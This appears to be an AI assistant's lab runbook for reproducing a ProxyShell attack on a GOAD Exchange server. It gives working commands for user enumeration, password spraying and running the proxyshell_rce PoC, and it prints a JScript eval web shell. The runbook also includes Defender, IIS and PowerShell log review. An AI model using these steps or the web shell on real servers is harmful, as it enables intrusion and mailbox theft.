mo

I re-read the Mayfly article from the beginning through the end. It covers GOAD Exchange installation, NTLM endpoint discovery, username enumeration, password spraying, ProxyLogon verification, ProxyShell, the `dmaasland/proxyshell-poc`, mailbox export, the PST transformation, decoding/encoding, and the later custom payload/Defender section. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Because you're doing this in your isolated GOAD lab, I'll make the lab steps concrete for your environment:

```text
Kali
   |
   | 192.168.56.0/24
   |
   +---- 192.168.56.21
         THE-EYRIE
         Exchange 2019
         sevenkingdoms.local
```

I will **not** give the Defender-evasion portion as an operational recipe. Instead, we'll test the same stage with a harmless marker and use Defender telemetry to understand why the original payload is detected.

---

# GOAD Exchange ProxyShell Lab Runbook

## Lab objective

By the end you will have reproduced:

```text
1. Exchange discovery
2. NTLM endpoint discovery
3. Domain/server identification
4. Username enumeration
5. Password spraying
6. ProxyLogon vulnerability check
7. ProxyShell vulnerability check
8. ProxyShell PoC analysis/execution in GOAD
9. Exchange PowerShell access
10. Mailbox Import Export role
11. Mailbox export/write primitive
12. PST transformation observation
13. Decode the encoded payload
14. Encode the payload again
15. Verify encode/decode round-trip
16. Examine Defender detection
17. Collect Windows/IIS/PowerShell telemetry
```

---

# Phase 0 — Define your variables

On Kali:

```bash
export EXCHANGE_IP=192.168.56.21
export DOMAIN=sevenkingdoms.local
export EXCHANGE="https://${EXCHANGE_IP}"
```

Verify:

```bash
echo "$EXCHANGE_IP"
echo "$DOMAIN"
echo "$EXCHANGE"
```

You should see:

```text
192.168.56.21
sevenkingdoms.local
https://192.168.56.21
```

---

# Phase 1 — Make sure GOAD is running

Go to your GOAD directory.

For example:

```bash
cd /mnt/vmstorage/vmware-vms/GOAD
```

Check:

```bash
vagrant status
```

You need `THE-EYRIE` running.

You can also check the host:

```bash
ping -c 3 192.168.56.21
```

Then:

```bash
nmap -Pn -p 443 192.168.56.21
```

Expected:

```text
443/tcp open https
```

---

# Phase 2 — Verify OWA

Run:

```bash
curl -k -I "$EXCHANGE/owa/"
```

You should receive an HTTP response.

Now open:

```text
https://192.168.56.21/owa/
```

in your browser.

The Mayfly article uses the Exchange `/owa` interface as the starting point. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 3 — Identify the Exchange server

Run:

```bash
nmap -Pn -sV -p 443 192.168.56.21
```

Then:

```bash
nmap -Pn -p 443 \
  --script=http-ntlm-info \
  --script-args http-ntlm-info.root=/autodiscover/ \
  192.168.56.21
```

The Mayfly article uses this exact NTLM-information technique. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

You want to identify:

```text
AD Domain Name
Server Name
DNS Domain Name
FQDN
Parent DNS Domain
```

For your GOAD lab, the expected values are approximately:

```text
AD Domain Name:    SEVENKINGDOMS
Server Name:       THE-EYRIE
DNS Domain Name:   sevenkingdoms.local
FQDN:              the-eyrie.sevenkingdoms.local
```

---

# Phase 4 — Install NTLMRecon

On Kali:

```bash
cd ~/tools
```

If you haven't already cloned it:

```bash
git clone https://github.com/pwnfoo/NTLMRecon.git
```

Enter it:

```bash
cd NTLMRecon
```

Create the environment:

```bash
python3 -m venv venv
```

Activate:

```bash
source venv/bin/activate
```

Install:

```bash
python3 setup.py install
```

Verify:

```bash
ntlmrecon --help
```

---

# Phase 5 — Run NTLMRecon

Run:

```bash
ntlmrecon --input https://192.168.56.21
```

The article uses this workflow and then converts its CSV output into JSON for readability. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Check the output:

```bash
ls -lh
```

If you have:

```text
ntlmrecon.csv
```

run:

```bash
cat ntlmrecon.csv |
python -c 'import csv,json,sys; print(json.dumps([dict(r) for r in csv.DictReader(sys.stdin)]))' |
jq
```

Record:

```text
Domain:
Server:
DNS domain:
FQDN:
```

---

# Phase 6 — Prepare your username list

You already created a Game-of-Thrones-style username list for this lab.

Go to the directory containing it:

```bash
cd ~/tools/NTLMRecon
```

Check:

```bash
head users.txt
```

You want usernames such as:

```text
jaime.lannister
cersei.lannister
tyrion.lannister
...
```

If you're starting from the original hyphenated file:

```bash
sed 's/-/./g' got-character-slugs.txt |
sort -u > users.txt
```

Then:

```bash
wc -l users.txt
```

---

# Phase 7 — Install msmailprobe

```bash
cd ~/tools
```

Clone:

```bash
git clone https://github.com/busterb/msmailprobe.git
```

Enter:

```bash
cd msmailprobe
```

Build:

```bash
go build
```

Check:

```bash
./msmailprobe --help
```

The Mayfly article uses `msmailprobe userenum --onprem` for this stage. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 8 — Enumerate Exchange usernames

Run:

```bash
./msmailprobe userenum \
  --onprem \
  -t 192.168.56.21 \
  -U ~/tools/NTLMRecon/users.txt \
  -o validusers.txt
```

Check:

```bash
cat validusers.txt
```

Then:

```bash
wc -l validusers.txt
```

### Important

The article explicitly warns that this process generates failed login attempts against valid accounts. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

That is actually useful for your security lab because you can later examine the corresponding authentication telemetry.

---

# Phase 9 — Password spraying

The article uses TREVORspray and the lab password:

```text
cersei
```

Install/use your existing TREVORspray environment.

For example:

```bash
cd ~/tools/TREVORspray
source .venv/bin/activate
```

Then:

```bash
trevorspray \
  -u ~/tools/msmailprobe/validusers.txt \
  -p cersei \
  --url https://192.168.56.21/autodiscover/autodiscover.xml \
  -m owa
```

The article uses the same OWA/autodiscover approach. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

If you obtain a valid credential, record:

```text
Username:
Password:
```

Do not spray repeatedly against the same account unnecessarily.

---

# Phase 10 — Test ProxyLogon

Now we intentionally test the **older** Exchange vulnerability first.

Start Metasploit:

```bash
msfconsole
```

Inside Metasploit:

```text
use auxiliary/scanner/http/exchange_proxylogon
```

Set:

```text
set RHOSTS 192.168.56.21
```

Run:

```text
run
```

The Mayfly article's GOAD result is:

```text
The target is not vulnerable to CVE-2021-26855.
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

That's expected.

---

# Phase 11 — Understand why ProxyLogon fails

The article lists vulnerable Exchange 2019 builds below:

```text
15.02.0792.010
```

while GOAD uses:

```text
Exchange Server 2019 CU9
15.02.0858.x
```

So:

```text
ProxyLogon
    ↓
GOAD Exchange
    ↓
patched
    ↓
not exploitable
```

This is an important part of the lab.

**Don't skip it.**

You're demonstrating that vulnerability selection depends on the target's actual build.

---

# Phase 12 — Test ProxyShell routing

Now we move to:

```text
CVE-2021-34473
CVE-2021-34523
CVE-2021-31207
```

The Mayfly article moves to this chain after establishing that ProxyLogon is patched. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Run:

```bash
curl -k -i \
'https://192.168.56.21/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com'
```

Look at the response:

```text
HTTP/1.1 302
```

The article uses this as the initial ProxyShell indicator. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 13 — Examine `/mapi/nspi/`

Run:

```bash
curl -k -i https://192.168.56.21/mapi/nspi/
```

You are not simply looking for "200 OK."

You're investigating whether the Exchange frontend is exposing/routing the backend API behavior that forms part of the ProxyShell attack surface.

The article specifically calls out:

```text
/mapi/nspi/
```

at this point. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 14 — Understand the ProxyShell chain

Before running the PoC, understand what you're about to reproduce:

```text
             Internet-facing Exchange
                       |
                       v
                 Autodiscover
                       |
                       v
                SSRF/routing
                       |
                       v
                  Backend API
                       |
                       v
                  X-Rps-CAT
                       |
                       v
              Remote PowerShell
                       |
                       v
             Exchange privileges
                       |
                       v
           Mailbox Import Export
                       |
                       v
              Mailbox Export
                       |
                       v
                File write
```

This high-level chain is also reflected in the Metasploit implementation documentation: it builds an appropriate access token, obtains/uses mailbox permissions, and reaches Exchange PowerShell functionality. ([GitHub](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/http/exchange_proxyshell_rce.md?utm_source=chatgpt.com "metasploit-framework/documentation/modules/exploit/windows/http/exchange_proxyshell_rce.md at master · rapid7/metasploit-framework · GitHub"))

---

# Phase 15 — Download the complete PoC

The Mayfly article specifically references:

[dmaasland/proxyshell-poc](https://github.com/dmaasland/proxyshell-poc?utm_source=chatgpt.com)

On Kali:

```bash
cd ~/tools
```

Clone:

```bash
git clone https://github.com/dmaasland/proxyshell-poc.git
```

Enter:

```bash
cd proxyshell-poc
```

Inspect it:

```bash
ls -la
```

Then:

```bash
find . -maxdepth 2 -type f -print
```

Look for the major components:

```bash
grep -Rni "autodiscover" .
```

```bash
grep -Rni "X-Rps-CAT" .
```

```bash
grep -Rni "Mailbox" .
```

This is worth doing because you're learning the chain instead of treating the PoC as magic.

---

# Phase 16 — Run the ProxyShell PoC against GOAD

The Mayfly article uses:

```bash
python3 proxyshell_rce.py \
  -u https://10.4.10.21 \
  -e administrator@sevenkingdoms.local
```

Your GOAD address is:

```text
192.168.56.21
```

so the corresponding **lab target** is:

```bash
python3 proxyshell_rce.py \
  -u https://192.168.56.21 \
  -e administrator@sevenkingdoms.local
```

The article explicitly references this PoC and command. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

### Do not immediately run `dropshell`

First understand what the PoC accomplished.

---

# Phase 17 — If the PoC gives you Exchange PowerShell

The important milestone is:

```text
Exchange Remote PowerShell
```

You have demonstrated that the ProxyShell chain reached the Exchange management interface.

At this point, test **non-destructive Exchange commands first**.

For example:

```powershell
Get-ExchangeServer
```

Then:

```powershell
Get-Mailbox -ResultSize 10
```

Then:

```powershell
Get-OrganizationConfig |
    Select-Object Name
```

The objective here is to verify:

```text
ProxyShell
    ↓
RPS
    ↓
Exchange cmdlets
```

---

# Phase 18 — Examine mailbox permissions

Run:

```powershell
Get-ManagementRoleAssignment |
    Where-Object {
        $_.Role -like "*Mailbox Import Export*"
    } |
    Format-Table Role,RoleAssigneeName
```

The Mayfly article specifically introduces the `Mailbox Import Export` role at this stage. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 19 — Understand CVE-2021-31207

The important concept is:

```text
Exchange PowerShell
       |
       v
Mailbox Import Export
       |
       v
New-MailboxExportRequest
       |
       v
Mailbox data exported
       |
       v
Filesystem destination
```

The article uses `New-MailboxExportRequest` as the file-write primitive. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

For your lab, **don't immediately write an executable/webshell into IIS**.

Instead, use a harmless mailbox-export destination for the first experiment.

---

# Phase 20 — Verify mailbox export capability safely

First identify a mailbox:

```powershell
Get-Mailbox -ResultSize 10 |
    Select-Object DisplayName,PrimarySmtpAddress
```

Pick a lab mailbox.

Then inspect the available export cmdlet:

```powershell
Get-Command New-MailboxExportRequest
```

And:

```powershell
Get-Help New-MailboxExportRequest -Examples
```

This lets you understand the primitive without immediately deploying a webshell.

---

# Phase 21 — Inspect the resulting file

On THE-EYRIE:

```powershell
Get-ChildItem C:\inetpub\wwwroot -Force |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 20 Name,Length,LastWriteTime
```

If you have created a harmless lab artifact, inspect it:

```powershell
Get-Item C:\path\to\artifact |
    Format-List *
```

Then:

```powershell
Format-Hex C:\path\to\artifact
```

This is where you'll see why the article says the resulting file can contain unexpected surrounding bytes. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 22 — Understand the PST transformation

The article then moves into the really interesting reverse-engineering portion.

Conceptually:

```text
Payload
   ↓
Mailbox representation
   ↓
PST export
   ↓
Exchange writes data
   ↓
File
```

So:

```text
input bytes
      ≠
bytes appearing directly on disk
```

The article explains that the mailbox export/PST representation provides the transformation being studied. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 23 — Create your analysis directory

On Kali:

```bash
mkdir -p ~/tools/proxyshell-analysis
cd ~/tools/proxyshell-analysis
```

Create:

```bash
nano decode.py
```

Use the decoder from the Mayfly article that you already have.

The important portion is:

```python
webshell_decoded = base64.b64decode(webshell)
result = decode(webshell_decoded)
print(result)
```

The article's original encoded sample decodes to:

```html
<script language='JScript' runat='server'>
function Page_Load(){
    eval(Request['exec_code'],'unsafe');Response.End;
    }
</script>
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 24 — Run the decoder

```bash
python3 decode.py
```

Expected:

```html
<script language='JScript' runat='server'>
function Page_Load(){
    eval(Request['exec_code'],'unsafe');Response.End;
    }
</script>
```

If you get that exact payload:

```text
GOOD
```

Your decoder works.

---

# Phase 25 — Build the encoder

Create:

```bash
nano encode.py
```

Use the inverse-table implementation from the article.

The critical operation is:

```python
mpbbCryptFrom512.index(ord(i))
```

followed by:

```python
base64.b64encode(result)
```

The Mayfly article uses exactly this inverse operation to reverse the transformation. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# Phase 26 — Fix the Python output

If your script prints:

```text
b'ldZUhrdpFDnNqQbf...'
```

that's normal.

Python is displaying a `bytes` object.

For cleaner output change:

```python
print(base64.b64encode(result))
```

to:

```python
print(base64.b64encode(result).decode())
```

Then you'll get:

```text
ldZUhrdpFDnNqQbf...
```

instead of:

```text
b'ldZUhrdpFDnNqQbf...'
```

---

# Phase 27 — Run the encoder

Your command:

```bash
python3 encode.py webshell
```

should display:

```text
[+] Input shell :
<script language='JScript' runat='server'>
function Page_Load(){
    eval(Request['exec_code'],'unsafe');Response.End;
    }
</script>

[+] result :
ldZUhrdpFDnNqQbf...
```

That matches the behavior you're already seeing.

---

# Phase 28 — Perform the round-trip test

This is the most important test of your Python implementation.

Create:

```bash
nano test.txt
```

Put:

```text
GOAD-PROXYSHELL-TEST
```

Encode it.

Then decode the result.

The final output must be exactly:

```text
GOAD-PROXYSHELL-TEST
```

Conceptually:

```text
             ENCODE
                |
                v
GOAD-PROXYSHELL-TEST
                |
                v
        Base64/substitution
                |
                v
           encoded data
                |
                v
             DECODE
                |
                v
GOAD-PROXYSHELL-TEST
```

Your mathematical check is:

```text
decode(encode(x)) == x
```

---

# Phase 29 — Analyze the custom payload from Mayfly

The article next introduces a different payload using:

```text
ASP.NET/JScript
ActiveXObject
FileSystemObject
CopyFile
ProcessStartInfo
StandardOutput
exec_code
```

The purpose is to turn the web-accessible server-side code execution primitive into command execution. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Don't confuse it with the first payload.

### Payload 1

```text
eval(Request['exec_code'])
```

### Payload 2

```text
FileSystemObject
      +
ProcessStartInfo
      +
command parameter
```

They're two stages of the article.

---

# Phase 30 — Why the response parser changes

The original response handling expects the first payload's behavior.

The custom payload introduces:

```html
<span id="lblOutput">
```

and:

```html
</span>
```

The PoC therefore needs to locate the output differently.

Conceptually:

```text
HTTP response
     |
     v
find <span id="lblOutput">
     |
     v
extract content
     |
     v
find </span>
```

This is a parsing change.

---

# Phase 31 — Defender test

The article reports that Defender detects the automatic RCE attempt. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

**Do not disable Defender.**

Instead, turn that into a blue-team exercise.

On THE-EYRIE:

```powershell
Get-MpThreatDetection |
    Format-List *
```

Then:

```powershell
Get-WinEvent `
    -LogName "Microsoft-Windows-Windows Defender/Operational" `
    -MaxEvents 100 |
    Select-Object TimeCreated,Id,Message
```

---

# Phase 32 — Check IIS logs

On Exchange:

```powershell
Get-ChildItem C:\inetpub\logs\LogFiles -Recurse -File |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 20 FullName,LastWriteTime
```

Open the relevant IIS log:

```powershell
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\<LOGFILE>.log"
```

Look for:

```text
/autodiscover/
/mapi/
/owa/
```

and timestamps corresponding to your experiment.

---

# Phase 33 — Check PowerShell telemetry

```powershell
Get-WinEvent `
    -LogName "Microsoft-Windows-PowerShell/Operational" `
    -MaxEvents 100 |
    Select-Object TimeCreated,Id,Message
```

If Script Block Logging is enabled, investigate the relevant events.

---

# Phase 34 — Check Exchange logs

Look under:

```powershell
Get-ChildItem "C:\Program Files\Microsoft\Exchange Server\V15\Logging" -Directory
```

You can inspect recently modified files:

```powershell
Get-ChildItem "C:\Program Files\Microsoft\Exchange Server\V15\Logging" `
    -Recurse -File |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 30 FullName,LastWriteTime
```

---

# Phase 35 — Build your attack timeline

Create a table like this in your notes:

|Time|Action|System|Evidence|
|---|---|---|---|
|T1|NTLMRecon|Exchange|NTLM response|
|T2|Username enumeration|Exchange|IIS/auth logs|
|T3|Password spray|Exchange|authentication events|
|T4|ProxyLogon test|Exchange|HTTP request|
|T5|ProxyShell request|Exchange|IIS logs|
|T6|RPS access|Exchange|Exchange logs|
|T7|Mailbox export|Exchange|Exchange PowerShell|
|T8|File creation|Exchange|filesystem|
|T9|Defender detection|Exchange|Defender log|
|T10|Investigation|SOC|correlated telemetry|

This turns the exercise into something you can actually demonstrate professionally.

---

# Phase 36 — Final state

When you're finished, you should be able to explain this entire chain without relying on the PoC blindly:

```text
                 GOAD
                   |
                   v
          Exchange THE-EYRIE
                   |
                   v
             NTLMRecon
                   |
                   v
          sevenkingdoms.local
                   |
                   v
           User enumeration
                   |
                   v
            Password spray
                   |
                   v
              ProxyLogon
                   |
                   v
              PATCHED
                   |
                   v
              ProxyShell
                   |
                   v
             Autodiscover
                   |
                   v
              Backend API
                   |
                   v
              X-Rps-CAT
                   |
                   v
          Remote PowerShell
                   |
                   v
        Exchange permissions
                   |
                   v
      Mailbox Import Export
                   |
                   v
      Mailbox export primitive
                   |
                   v
             PST format
                   |
                   v
        transformed bytes
                   |
                   v
             decode.py
                   |
                   v
             encode.py
                   |
                   v
          round-trip proof
                   |
                   v
          Defender detection
                   |
                   v
        Windows/IIS telemetry
```

## Your exact checkpoint sequence

Don't move to the next checkpoint until the previous one works:

```text
[ ] 1. 192.168.56.21 responds
[ ] 2. /owa works
[ ] 3. NTLM information obtained
[ ] 4. sevenkingdoms.local confirmed
[ ] 5. THE-EYRIE confirmed
[ ] 6. users.txt prepared
[ ] 7. validusers.txt generated
[ ] 8. password spray tested
[ ] 9. ProxyLogon says patched
[ ] 10. ProxyShell 302 observed
[ ] 11. /mapi/nspi/ investigated
[ ] 12. proxyshell-poc downloaded
[ ] 13. PoC analyzed
[ ] 14. Exchange PowerShell access demonstrated
[ ] 15. Mailbox Import Export understood
[ ] 16. Safe mailbox-export experiment completed
[ ] 17. resulting file inspected
[ ] 18. decode.py works
[ ] 19. encode.py works
[ ] 20. encode → decode round trip works
[ ] 21. Defender telemetry collected
[ ] 22. IIS telemetry collected
[ ] 23. PowerShell telemetry collected
[ ] 24. attack timeline documented
```

**One important correction from the earlier runbook:** the Mayfly article itself says that GOAD's Exchange CU9 is above the ProxyLogon vulnerable build threshold, but the article then uses the ProxyShell routing check because that later chain is the focus. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly")) Also, current Metasploit documentation lists Exchange 2019 CU9 below `15.2.858.10` among affected builds, so for your lab you should verify the **actual installed build**, not infer vulnerability solely from the CU label. ([GitHub](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/http/exchange_proxyshell_rce.md?utm_source=chatgpt.com "metasploit-framework/documentation/modules/exploit/windows/http/exchange_proxyshell_rce.md at master · rapid7/metasploit-framework · GitHub"))

If you want to follow this interactively, **start at Phase 1 and paste the output after each checkpoint**; I can tell you exactly whether it matches the expected GOAD result before you proceed.